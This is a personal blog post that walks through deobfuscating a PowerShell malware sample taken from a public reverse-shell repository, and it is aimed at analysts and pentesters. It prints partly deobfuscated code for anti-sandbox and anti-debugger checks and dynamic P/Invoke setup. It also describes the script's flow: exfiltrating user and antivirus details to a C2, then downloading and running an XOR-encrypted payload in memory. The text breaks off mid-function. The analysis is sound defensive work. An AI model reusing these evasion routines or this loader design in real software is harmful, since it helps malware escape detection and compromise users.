<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> From Obfuscated Garbage to Clarity | Manuel Boll </title> <meta name="author" content="Manuel Boll"> <meta name="description" content="A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. "> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://kaeptenbalu.github.io/news/announcement_2/"> <script src="/assets/js/theme.js?a81d82887dd692e91686b43de4542f18"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
    initTheme();
  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Manuel</span> Boll </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">ctrl k <i class="ti ti-search"></i></span> </button> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">From Obfuscated Garbage to Clarity</h1> <p class="post-meta"> Created on May 15, 2025 </p> <p class="post-tags"> <i class="fa-solid fa-calendar fa-sm"></i> 2025 </p> </header> <article class="post-content"> <div id="markdown-content"> <p>Recently, I came across a heavily obfuscated PowerShell script—the kind you’ll often see in real-world malware or red team payloads. In this post, I’ll walk you through the process I used to deobfuscate it: decoding strings, rebuilding logic, and finally revealing the script’s real intent. This guide is for analysts, pentesters, and anyone interested in malware reverse engineering.<br> The script is sourced from the <a href="https://github.com/ZHacker13/ReverseTCPShell" rel="external nofollow noopener" target="_blank">ZHacker13/ReverseTCPShell</a> repository and, at the time of writing, was still undetected by VirusTotal. <a href="https://www.virustotal.com/gui/file/1339581bb26e157363b5b2ee044a6f97adfc672688915ad1ff01481ef4bfc382" rel="external nofollow noopener" target="_blank">VirusTotal</a></p> <hr> <h2 id="1-the-first-glance-a-wall-of-obfuscation">1. The First Glance: A Wall of Obfuscation</h2> <p>The original script looked like this:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">DRLGJTjyWALFmvoywkxE</span><span class="p">{</span><span class="w">
    </span><span class="nv">$gQNWEbnZTqqnpvELC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Reflection.AssemblyName</span><span class="p">(</span><span class="err">$</span><span class="p">(</span><span class="err">$</span><span class="p">(</span><span class="s2">"""</span><span class="si">$(</span><span class="err">$</span><span class="p">((</span><span class="mi">174</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">220</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">100</span><span class="si">)</span><span class="s2">|%{[char](</span><span class="bp">$_</span><span class="s2">/2)})-join'')"""</span><span class="p">)</span><span class="o">|</span><span class="n">iex</span><span class="p">));</span><span class="w">
    </span><span class="c"># ...tons more...</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <p>iterally every string and function name is randomized or hidden behind run-time decoding. Classic indicators:</p> <ul> <li>Math operations in arrays (e.g. <a href="$_/2">char</a>)</li> <li>Inline iex calls</li> <li>ong, random variable names</li> </ul> <h2 id="2-decoding-the-strings">2. Decoding the Strings</h2> <p>Step one: Figure out what each encoded string represents. For example:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="p">(</span><span class="err">$</span><span class="p">((</span><span class="mi">174</span><span class="p">,</span><span class="mi">210</span><span class="p">,</span><span class="mi">220</span><span class="p">,</span><span class="mi">102</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span><span class="o">|%</span><span class="p">{[</span><span class="n">char</span><span class="p">](</span><span class="bp">$_</span><span class="n">/2</span><span class="p">)})</span><span class="o">-join</span><span class="s1">''</span><span class="p">)</span><span class="w">
</span></code></pre></div></div> <p>Decode it manually (or with a quick helper script):</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[char](174/2) → [char]87 → W

[char](210/2) → [char]105 → i

[char](220/2) → [char]110 → n

[char](102/2) → [char]51 → 3

[char](100/2) → [char]50 → 2
</code></pre></div></div> <p>I repeated this for all encoded sections. Many more common Windows API strings started appearing, like “MEMORYSTATUSEX”, “kernel32.dll”, “IsDebuggerPresent”, etc.</p> <h2 id="3-rebuilding-functionsline-by-line">3. Rebuilding Functions—Line by Line</h2> <p>After decoding the key strings, I started renaming the random variables and functions to match their real purpose. I worked through each function, identifying:</p> <ul> <li>Windows API calls (via P/Invoke)</li> <li>Environment/sandbox checks</li> <li>Memory and disk inspection</li> <li>Suspicious process detection</li> </ul> <p>For example, the obfuscated check for system RAM:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">function</span><span class="w"> </span><span class="nf">BbkTfRaCBogtajfF</span><span class="p">{</span><span class="w">
    </span><span class="nv">$snLCAOxRlXCgmRIZsovqwnstTKuOT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">MEMORYSTATUSEX</span><span class="w">
    </span><span class="nv">$snLCAOxRlXCgmRIZsovqwnstTKuOT</span><span class="o">.</span><span class="nf">dwLength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">64</span><span class="w">
    </span><span class="kr">if</span><span class="p">(</span><span class="o">!</span><span class="p">[</span><span class="n">rOQcgNZuUHOSIIzxCh</span><span class="p">]::</span><span class="n">GlobalMemoryStatusEx</span><span class="p">([</span><span class="n">ref</span><span class="p">]</span><span class="nv">$snLCAOxRlXCgmRIZsovqwnstTKuOT</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="kr">return</span><span class="w"> </span><span class="bp">$false</span><span class="p">}</span><span class="w">
    </span><span class="nv">$dAtFKjniAWeEaAqdw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">int</span><span class="p">](</span><span class="nv">$snLCAOxRlXCgmRIZsovqwnstTKuOT</span><span class="o">.</span><span class="nf">ullTotalPhys</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">1024</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">1024</span><span class="p">)</span><span class="w">
    </span><span class="kr">if</span><span class="p">(</span><span class="nv">$dAtFKjniAWeEaAqdw</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <p>Check if system RAM is less than 256 MB—a common anti-sandbox trick.</p> <h2 id="4-recognizing-anti-analysis--evasion-techniques">4. Recognizing Anti-Analysis &amp; Evasion Techniques</h2> <p>The next block of functions checked for things like:</p> <ul> <li>Running in a VM (QEMU, VMware, etc.)</li> <li>Presence of analysis tools (wireshark.exe, ollydbg.exe, etc.)</li> <li>Odd system properties or hostnames</li> <li>Low RAM or disk space (signs of a sandbox)</li> </ul> <p>Example: A function cycles through process names, looking for debuggers or VM tools and returns true if any are found.</p> <h2 id="5-understanding-the-main-flow">5. Understanding the Main Flow</h2> <p>After unwrapping the helper functions, I reconstructed the main logic:</p> <ol> <li>Initial Checks: Only proceed if not in a VM/sandbox/debugger, etc.</li> <li>Data Exfiltration: Collect username and AV product info, encode, and send to a remote C2.</li> <li>Payload Download &amp; Execution: - Download an encrypted payload - Decrypt with XOR (key often also obfuscated) - Execute payload in-memory via Invoke-Expression</li> <li>Error Handling: On errors, send diagnostics to another C2 URL.</li> </ol> <h2 id="6-final-the-cleaned-up-script">6. Final: The Cleaned-Up Script</h2> <p>After going through every function, renaming variables, and pulling out hidden strings, I ended up with a clear, readable script. Here’s a simplified and annotated version:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">function</span><span class="w"> </span><span class="nf">IsLowRAM</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$memStatus</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">MEMORYSTATUSEX</span><span class="w">
    </span><span class="nv">$memStatus</span><span class="o">.</span><span class="nf">dwLength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">64</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="p">[</span><span class="n">Win32</span><span class="p">]::</span><span class="n">GlobalMemoryStatusEx</span><span class="p">([</span><span class="n">ref</span><span class="p">]</span><span class="nv">$memStatus</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$false</span><span class="w"> </span><span class="p">}</span><span class="w">
    </span><span class="nv">$ramMB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">int</span><span class="p">](</span><span class="nv">$memStatus</span><span class="o">.</span><span class="nf">ullTotalPhys</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">1024</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">1024</span><span class="p">)</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$ramMB</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="kr">function</span><span class="w"> </span><span class="nf">IsSandboxProcessRunning</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$targets</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="s1">'ollydbg.exe'</span><span class="p">,</span><span class="w"> </span><span class="err">...</span><span class="p">,</span><span class="s1">'xenservice.exe'</span><span class="p">)</span><span class="w">
    </span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$targets</span><span class="w"> </span><span class="o">-contains</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="o">.</span><span class="nf">ToLower</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$true</span><span class="w"> </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="c"># ... more helper functions for anti-VM, etc.</span><span class="w">

</span><span class="kr">function</span><span class="w"> </span><span class="nf">Main</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Security.Principal.WindowsIdentity</span><span class="p">]::</span><span class="n">GetCurrent</span><span class="p">()</span><span class="o">.</span><span class="nf">Name</span><span class="w">
    </span><span class="nv">$avName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">...</span><span class="w"> </span><span class="c"># WMI query for AV</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="err">&lt;</span><span class="n">no</span><span class="w"> </span><span class="nx">evasion</span><span class="w"> </span><span class="nx">triggers</span><span class="err">&gt;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="c"># Send exfil data</span><span class="w">
        </span><span class="c"># Download and run payload</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div> <h2 id="7-the-final-deofuscated-code">7. The Final Deofuscated Code</h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">function</span><span class="w"> </span><span class="nf">DRLGJTjyWALFmvoywkxE</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="c"># Register API structures and functions dynamically (MEMORYSTATUSEX etc.)</span><span class="w">
    </span><span class="nv">$gQNWEbnZTqqnpvELC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Reflection.AssemblyName</span><span class="p">(</span><span class="s1">'Win32'</span><span class="p">)</span><span class="w">
    </span><span class="nv">$iweQbxkJaayjuNejyemUesBIc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain.DefineDynamicAssembly</span><span class="p">(</span><span class="nv">$gQNWEbnZTqqnpvELC</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">Reflection.Emit.AssemblyBuilderAccess</span><span class="p">]::</span><span class="n">Run</span><span class="p">)</span><span class="w">
    </span><span class="nv">$ModuleBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$iweQbxkJaayjuNejyemUesBIc</span><span class="o">.</span><span class="nf">DefineDynamicModule</span><span class="p">(</span><span class="s2">"Win32"</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">)</span><span class="w">

    </span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$ModuleBuilder</span><span class="o">.</span><span class="nf">DefineType</span><span class="p">(</span><span class="w">
        </span><span class="s2">"MEMORYSTATUSEX"</span><span class="p">,</span><span class="w">
        </span><span class="p">[</span><span class="n">System.Reflection.TypeAttributes</span><span class="p">]::</span><span class="kr">Public</span><span class="w"> </span><span class="o">-bor</span><span class="w">
        </span><span class="p">[</span><span class="n">System.Reflection.TypeAttributes</span><span class="p">]::</span><span class="n">Sealed</span><span class="w"> </span><span class="o">-bor</span><span class="w">
        </span><span class="p">[</span><span class="n">System.Reflection.TypeAttributes</span><span class="p">]::</span><span class="n">SequentialLayout</span><span class="p">,</span><span class="w">
        </span><span class="p">[</span><span class="n">System.ValueType</span><span class="p">]</span><span class="w">
    </span><span class="p">)</span><span class="w">

    </span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">DefineField</span><span class="p">(</span><span class="s2">"dwLength"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.FieldAttributes</span><span class="p">]::</span><span class="nx">Public</span><span class="p">)</span><span class="w">
    </span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">DefineField</span><span class="p">(</span><span class="s2">"dwMemoryLoad"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.FieldAttributes</span><span class="p">]::</span><span class="nx">Public</span><span class="p">)</span><span class="w">
    </span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">DefineField</span><span class="p">(</span><span class="s2">"ullTotalPhys"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">UInt64</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.FieldAttributes</span><span class="p">]::</span><span class="nx">Public</span><span class="p">)</span><span class="w">
    </span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">DefineField</span><span class="p">(</span><span class="s2">"ullAvailPhys"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">UInt64</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.FieldAttributes</span><span class="p">]::</span><span class="nx">Public</span><span class="p">)</span><span class="w">
    </span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">DefineField</span><span class="p">(</span><span class="s2">"ullTotalPageFile"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">UInt64</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.FieldAttributes</span><span class="p">]::</span><span class="nx">Public</span><span class="p">)</span><span class="w">
    </span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">DefineField</span><span class="p">(</span><span class="s2">"ullAvailPageFile"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">UInt64</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.FieldAttributes</span><span class="p">]::</span><span class="nx">Public</span><span class="p">)</span><span class="w">
    </span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">DefineField</span><span class="p">(</span><span class="s2">"ullTotalVirtual"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">UInt64</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.FieldAttributes</span><span class="p">]::</span><span class="nx">Public</span><span class="p">)</span><span class="w">
    </span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">DefineField</span><span class="p">(</span><span class="s2">"ullAvailVirtual"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">UInt64</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.FieldAttributes</span><span class="p">]::</span><span class="nx">Public</span><span class="p">)</span><span class="w">
    </span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">DefineField</span><span class="p">(</span><span class="s2">"ullAvailExtendedVirtual"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">UInt64</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.FieldAttributes</span><span class="p">]::</span><span class="nx">Public</span><span class="p">)</span><span class="w">

    </span><span class="nv">$MEMORYSTATUSEX_TypeObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">CreateType</span><span class="p">()</span><span class="w">

    </span><span class="c"># Define Win32 API methods using P/Invoke</span><span class="w">
    </span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$ModuleBuilder</span><span class="o">.</span><span class="nf">DefineType</span><span class="p">(</span><span class="s2">"rOQcgNZuUHOSIIzxCh"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Public, Class"</span><span class="p">)</span><span class="w">
    </span><span class="nv">$DllImportCtor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Runtime.InteropServices.DllImportAttribute</span><span class="p">]</span><span class="o">.</span><span class="nf">GetConstructor</span><span class="p">(@([</span><span class="n">String</span><span class="p">]))</span><span class="w">
    </span><span class="nv">$SetLastErrorField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Runtime.InteropServices.DllImportAttribute</span><span class="p">]</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s2">"SetLastError"</span><span class="p">)</span><span class="w">

    </span><span class="nv">$IKShBKVmWEOGXMvFmV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Reflection.Emit.CustomAttributeBuilder</span><span class="p">(</span><span class="w">
        </span><span class="nv">$DllImportCtor</span><span class="p">,</span><span class="w">
        </span><span class="p">@(</span><span class="s2">"kernel32.dll"</span><span class="p">),</span><span class="w">
        </span><span class="p">[</span><span class="n">Reflection.FieldInfo</span><span class="p">[]]@(</span><span class="nv">$SetLastErrorField</span><span class="p">),</span><span class="w">
        </span><span class="p">@(</span><span class="bp">$true</span><span class="p">)</span><span class="w">
    </span><span class="p">)</span><span class="w">

    </span><span class="nv">$funcs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="w">
        </span><span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="s2">"GlobalMemoryStatusEx"</span><span class="p">;</span><span class="w"> </span><span class="nx">RetType</span><span class="o">=</span><span class="p">[</span><span class="n">bool</span><span class="p">];</span><span class="w"> </span><span class="nx">ParamTypes</span><span class="o">=</span><span class="p">[</span><span class="n">Type</span><span class="p">[]]@([</span><span class="n">MEMORYSTATUSEX</span><span class="p">]</span><span class="err">.MakeByRefType(</span><span class="p">)</span><span class="err">)</span><span class="p">},</span><span class="w">
        </span><span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="s2">"GetTickCount64"</span><span class="p">;</span><span class="w">      </span><span class="nx">RetType</span><span class="o">=</span><span class="p">[</span><span class="n">UInt64</span><span class="p">];</span><span class="w"> </span><span class="nx">ParamTypes</span><span class="o">=</span><span class="p">[</span><span class="n">Type</span><span class="p">[]]@()},</span><span class="w">
        </span><span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="s2">"IsDebuggerPresent"</span><span class="p">;</span><span class="w">    </span><span class="nx">RetType</span><span class="o">=</span><span class="p">[</span><span class="n">bool</span><span class="p">];</span><span class="w"> </span><span class="nx">ParamTypes</span><span class="o">=</span><span class="p">[</span><span class="n">Type</span><span class="p">[]]@()},</span><span class="w">
        </span><span class="p">@{</span><span class="nx">Name</span><span class="o">=</span><span class="s2">"GetDiskFreeSpaceExA"</span><span class="p">;</span><span class="w"> </span><span class="nx">RetType</span><span class="o">=</span><span class="p">[</span><span class="n">bool</span><span class="p">];</span><span class="w"> </span><span class="nx">ParamTypes</span><span class="o">=</span><span class="p">[</span><span class="n">Type</span><span class="p">[]]@([</span><span class="n">IntPtr</span><span class="p">],[</span><span class="n">UInt64</span><span class="p">]</span><span class="err">.MakeByRefType(</span><span class="p">),[</span><span class="n">UInt64</span><span class="p">]</span><span class="err">.</span><span class="nx">MakeByRefType</span><span class="err">()</span><span class="p">,[</span><span class="n">UInt64</span><span class="p">]</span><span class="err">.</span><span class="nx">MakeByRefType</span><span class="err">())</span><span class="p">}</span><span class="w">
    </span><span class="p">)</span><span class="w">
    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$f</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$funcs</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">DefinePInvokeMethod</span><span class="p">(</span><span class="w">
            </span><span class="nv">$f</span><span class="o">.</span><span class="nf">Name</span><span class="p">,</span><span class="w"> </span><span class="s2">"kernel32.dll"</span><span class="p">,</span><span class="w">
            </span><span class="p">[</span><span class="n">Reflection.MethodAttributes</span><span class="p">]::</span><span class="kr">Public</span><span class="w"> </span><span class="o">-bor</span><span class="w"> </span><span class="p">[</span><span class="n">Reflection.MethodAttributes</span><span class="p">]::</span><span class="kr">Static</span><span class="p">,</span><span class="w">
            </span><span class="p">[</span><span class="n">Reflection.CallingConventions</span><span class="p">]::</span><span class="n">Standard</span><span class="p">,</span><span class="w">
            </span><span class="nv">$f</span><span class="o">.</span><span class="nf">RetType</span><span class="p">,</span><span class="w"> </span><span class="nv">$f</span><span class="o">.</span><span class="nf">ParamTypes</span><span class="p">,</span><span class="w">
            </span><span class="p">[</span><span class="n">Runtime.InteropServices.CallingConvention</span><span class="p">]::</span><span class="n">Winapi</span><span class="p">,</span><span class="w">
            </span><span class="p">[</span><span class="n">Runtime.InteropServices.CharSet</span><span class="p">]::</span><span class="n">Auto</span><span class="w">
        </span><span class="p">)</span><span class="w">
        </span><span class="nv">$m</span><span class="o">.</span><span class="nf">SetCustomAttribute</span><span class="p">(</span><span class="nv">$IKShBKVmWEOGXMvFmV</span><span class="p">)</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="nv">$MEMORYSTATUSEX_Type</span><span class="o">.</span><span class="nf">CreateType</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="kr">function</span><span class="w"> </span><span class="nf">Is32BitOrOldWindows</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">return</span><span class="w"> </span><span class="o">!</span><span class="nv">${Env:ProgramFiles(x86)}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">IsDebuggerPresent</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">return</span><span class="w"> </span><span class="p">[</span><span class="n">rOQcgNZuUHOSIIzxCh</span><span class="p">]::</span><span class="n">IsDebuggerPresent</span><span class="p">()</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">IsRecentlyStarted</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">return</span><span class="w"> </span><span class="p">([</span><span class="n">rOQcgNZuUHOSIIzxCh</span><span class="p">]::</span><span class="n">GetTickCount64</span><span class="p">()</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="p">(</span><span class="mi">1000</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">3</span><span class="p">))</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">IsLowRAM</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$memStatus</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">MEMORYSTATUSEX</span><span class="w">
    </span><span class="nv">$memStatus</span><span class="o">.</span><span class="nf">dwLength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">64</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="p">[</span><span class="n">rOQcgNZuUHOSIIzxCh</span><span class="p">]::</span><span class="n">GlobalMemoryStatusEx</span><span class="p">([</span><span class="n">ref</span><span class="p">]</span><span class="nv">$memStatus</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">return</span><span class="w"> </span><span class="bp">$false</span><span class="w"> </span><span class="p">}</span><span class="w">
    </span><span class="nv">$ramMB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">int</span><span class="p">](</span><span class="nv">$memStatus</span><span class="o">.</span><span class="nf">ullTotalPhys</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">1024</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">1024</span><span class="p">)</span><span class="w">
